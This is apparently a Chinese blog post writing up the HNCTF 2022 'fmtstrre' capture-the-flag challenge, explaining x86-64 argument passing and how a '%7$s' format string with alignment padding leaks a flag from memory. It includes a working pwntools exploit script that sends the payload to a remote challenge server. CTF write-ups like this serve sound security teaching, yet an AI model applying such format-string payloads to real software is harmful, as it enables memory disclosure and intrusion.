---
title: PWN入门-格式化字符串漏洞做题
date: 2024-01-26 23:07:36
tags: PWN
mathjax: true
---

# PWN入门-格式化字符串漏洞做题

## [HNCTF 2022 Week1]fmtstrre

函数传参前6个用寄存器rdi、rsi、rdx、rcx、r8、r9，从第七个开始压栈，所以“%7\$s”表示输出栈地址第1个位置当作字符串输出，后4个“a”用于将格式化字符串8字节对齐，看到flag只出来一半就再往前推地址。

```python
from pwn import *
context(log_level='debug',os='linux',arch='amd64')
elf=ELF('./attachment')
p=remote("node5.anna.nssctf.cn",28285)
p.recvuntil("Input your format string.")
fmtstr=b'%7$saaaa'
name_addr=p64(elf.sym["name"]-0x20)
payload1=flat([fmtstr,name_addr])
p.sendline(payload1)
p.interactive()
```
